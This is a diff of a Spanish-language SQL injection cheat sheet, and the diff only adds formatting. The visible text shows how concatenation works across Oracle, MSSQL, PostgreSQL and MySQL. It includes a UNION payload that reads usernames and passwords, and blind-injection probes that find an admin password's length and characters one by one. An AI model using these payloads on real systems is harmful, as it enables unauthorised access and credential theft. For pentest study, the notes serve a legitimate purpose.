@@ -69,21 +69,21 @@ USER-- | *cuando se tiene un usuario se podria probar la vulnerabilidad tratando
 
 #### MOSTRAR MULTIPLES VALORES EN UNA MISMA COLUMNA [CONCATENACION]
 
-    NOTA: importante definir la columna que sea formato string.
+    NOTA: Importante definir la columna que sea formato string.
 
-~: separador
+~: Separador
 
-ORACLE: || \
+**ORACLE: ||** \
 ex: 'string'||'string' \
 ' UNION SELECT username || '~' || password FROM users-- 
 
-MICROSOFT: + \
+**MICROSOFT: +** \
 ex: 'string'+'string' 
 
-POSTGRESQL: || \
+**POSTGRESQL: ||** \
 ex: 'string'||'string' 
 
-MySQL: [ ] "space" \
+**MySQL: [ ] "space"** \
 ex: 'string' 'string'
 
 ## BLIND SQL INJECTION
@@ -105,18 +105,18 @@ _ENUMERAR EL TAMANO DE UN CAMPO ?
 ' AND SELECT [field_name] FROM [table_name] WHERE [field_name]='[value]' AND LENGTH(field_name)>1)='value'--
 ' AND SELECT username FROM users WHERE username='admin' AND LENGTH(password)>1)='admin'--
 
-    NOTA: es necesario iterar el numero de posicion hasta no tener expected responses, de esa manera se obtiene la cantidad de caracteres.
+    NOTA: Es necesario iterar el numero de posicion hasta no tener expected responses, de esa manera se obtiene la cantidad de caracteres.
 
 _COMO ENUMERAR EL CONTENIDO "STRING" DE UN CAMPO ?
 
---> funcion substring
+--> Funcion SUBSTRING
 
 El primer numero, por ejemplo, "4", es la posicion a iterar. el segundo numero es a una sola posicion.
 
-Oracle:	SUBSTR('string', 4, 1) \
-Microsoft:	SUBSTRING('string', 4, 1) \
-PostgreSQL:	SUBSTRING('string', 4, 1) \
-MySQL:	SUBSTRING('string', 4, 1)
+**Oracle:**	SUBSTR('string', 4, 1) \
+**Microsoft:**	SUBSTRING('string', 4, 1) \
+**PostgreSQL:**	SUBSTRING('string', 4, 1) \
+**MySQL:**	SUBSTRING('string', 4, 1)
 
 ' AND SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
 
